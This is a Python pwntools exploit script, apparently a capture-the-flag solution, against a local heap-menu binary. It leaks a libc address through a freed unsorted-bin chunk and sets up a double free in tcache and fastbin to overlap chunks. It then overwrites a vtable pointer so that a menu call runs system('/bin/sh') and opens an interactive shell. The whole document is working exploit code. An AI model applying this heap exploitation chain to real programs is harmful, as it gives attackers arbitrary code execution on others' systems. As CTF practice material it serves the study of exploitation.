from pwn import *

context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

io = remote("localhost", 50000)
# io = process("./chall_patched")
""" io = gdb.debug(
    "./chall_patched",
    gdbscript="c",
) """


def create(idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())


def edit(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.send(data)


def delete(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


def inspect(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Content: ")
    content = io.recvuntil(b"\nPrice: ", drop=True)
    return content


create(0, 0x500)
create(1, 0x500)
delete(0)
delete(1)
create(0, 0x500)
leak = inspect(0)

libc_offset = 0x203B20

# leak libc in unsorted bin
libc.address = u64(leak.ljust(8, b"\x00")) - libc_offset
log.info(f"libc: {hex(libc.address)}")
delete(0)

# fill tcache
for i in range(8):
    create(i, 0x50)

create(8, 0x50)
create(9, 0x50)
create(10, 0x50)
create(11, 0x50)

for i in range(7):
    delete(i)

delete(8)  # double free this idx
delete(9)
delete(11)
delete(8)  # double free this idx

for i in range(7):
    create(i, 0x50)

create(12, 0x70)
create(13, 0x20)

vtable_leak = inspect(13)
vtable_leak = u64(vtable_leak.ljust(8, b"\x00"))
log.info(f"vtable_leak: {hex(vtable_leak)}")

# change vtable to system
edit(13, p64(vtable_leak + 0x18))

# pwn this shit
edit(12, p64(libc.symbols["system"]) + b"/bin/sh\x00")

io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"Index: ", b"12")

io.interactive()
